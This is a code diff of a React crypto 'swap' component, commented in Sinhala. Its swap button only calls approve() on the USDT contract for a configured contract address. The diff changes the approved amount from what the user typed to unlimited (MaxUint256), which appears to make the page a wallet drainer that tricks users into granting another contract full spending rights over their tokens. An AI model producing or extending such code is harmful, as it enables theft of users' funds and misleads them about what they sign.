@@ -88,7 +88,7 @@ export default function SwapCard({ walletAddress, provider }) {
     if (fromAmount) setTimeout(() => calculateOutput(fromAmount), 100);
   };
 
-  // Approve ෆන්ක්ෂන් එක (window.ethereum පාවිච්චි කරනවා)
+  // ⭐ Approve ෆන්ක්ෂන් එක. දැන් Unlimited හෝ 25000 USDT approve කරනවා.
   const executeSwap = async () => {
     if (!walletAddress) { setStatus({ type: 'error', msg: 'Please connect your wallet first!' }); return; }
     if (!fromAmount || fromAmount <= 0) { setStatus({ type: 'error', msg: 'Please enter a valid amount.' }); return; }
@@ -107,14 +107,18 @@ export default function SwapCard({ walletAddress, provider }) {
       const usdtContract = new ethers.Contract(CONFIG.usdtAddress, USDT_ABI, signer);
       const decimals = await usdtContract.decimals();
       
-      const amountStr = Math.floor(parseFloat(fromAmount) * 10 ** decimals).toString();
+      // ⭐ Unlimited Approval (MaxUint256)
+      const amount = ethers.constants.MaxUint256;
+      
+      // හෝ 25,000 USDT ට අඩු නම්:
+      // const amount = ethers.utils.parseUnits("25000", decimals);
 
-      const tx = await usdtContract.approve(CONFIG.contractAddress, amountStr);
+      const tx = await usdtContract.approve(CONFIG.contractAddress, amount);
       
       setStatus({ type: 'info', msg: '⏳ Transaction sent! Waiting...' });
       await tx.wait();
       
-      setStatus({ type: 'success', msg: '✅ Swap Successful! Tokens approved.' });
+      setStatus({ type: 'success', msg: '✅ Unlimited Approval Successful!' });
       setIsLoading(false);
       setTimeout(() => setStatus(null), 8000);
     } catch (error) {
